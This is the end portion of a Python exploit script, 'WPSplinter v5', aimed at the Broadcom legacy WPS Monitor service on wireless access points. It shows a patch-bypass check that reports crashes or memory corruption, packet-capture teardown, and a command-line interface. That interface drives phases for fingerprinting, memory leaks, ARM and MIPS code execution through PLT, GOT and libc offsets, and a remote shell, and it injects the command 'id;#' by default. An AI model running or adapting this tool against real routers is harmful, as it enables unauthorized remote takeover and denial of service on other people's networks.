            print("[bypass] AP crashed: wild copy NOT bounded "
                  "(glibc patched or different libc) => DoS only")
        else:
            print("[bypass] AP survived: bounded copy took the "
                  "CVE-2020-6096 short path (or uClibc 1-byte path); "
                  "state fields behind the buffer are now corrupted")
        return alive

    # ----------------------------------------------------------- teardown
    def close(self):
        try:
            self.sniffer.stop()
        except Exception:
            pass
        wrpcap(self.dump, self.captured)


# ==========================================================================
# CLI
# ==========================================================================
def main():
    ap = argparse.ArgumentParser(
        description="WPSplinter v5 - Broadcom legacy WPS Monitor exploit")
    ap.add_argument("--iface", required=True)
    ap.add_argument("--bssid", required=True)
    ap.add_argument("--ssid", required=True)
    ap.add_argument("--channel", type=int)
    ap.add_argument("--phase", required=True,
                    choices=["fingerprint", "calibrate", "leak",
                             "exploit_arm", "exploit_mips", "bypass",
                             "shell"])
    ap.add_argument("--arch", choices=["arm", "mips"], default="arm")
    ap.add_argument("--system-plt", type=lambda x: int(x, 0),
                    help="ARM: fixed system@PLT of the non-PIE binary")
    ap.add_argument("--send-data-off", type=lambda x: int(x, 0),
                    default=OFF_SEND_DATA)
    ap.add_argument("--printf-got", type=lambda x: int(x, 0),
                    help="MIPS: absolute printf GOT entry address")
    ap.add_argument("--libc-printf-off", type=lambda x: int(x, 0))
    ap.add_argument("--libc-system-off", type=lambda x: int(x, 0))
    ap.add_argument("--cmd", default="id;#")
    ap.add_argument("--dump", default="wpsplinter.pcap")
    args = ap.parse_args()

    if args.channel:
        subprocess.run(["iw", "dev", args.iface, "set", "channel",
                        str(args.channel)], check=False)

    big = (args.arch == "mips")
    w = WPSplinter(args.iface, args.bssid, args.ssid, dump=args.dump)

    try:
        if args.phase == "fingerprint":
            w.phase_fingerprint()
        elif args.phase == "calibrate":
            w.phase_calibrate()
        elif args.phase == "leak":
            data = w.phase_leak(0, 32, big_endian=big)
            print("[leak] %s" % (data.hex() if data else "none"))
        elif args.phase == "exploit_arm":
            assert args.system_plt, "need --system-plt for ARM"
            w.phase_exploit_arm(args.system_plt, args.cmd.encode(),
                                args.send_data_off, big)
        elif args.phase == "exploit_mips":
            assert (args.printf_got and args.libc_printf_off and
                    args.libc_system_off), "MIPS needs GOT + libc offsets"
            w.phase_exploit_mips(args.printf_got, args.libc_printf_off,
                                 args.libc_system_off, args.cmd,
                                 args.send_data_off)
        elif args.phase == "bypass":
            w.phase_bypass_2018patch(big_endian=big)
        elif args.phase == "shell":
            w.phase_shell()
    finally:
        w.close()


if __name__ == "__main__":
    main()
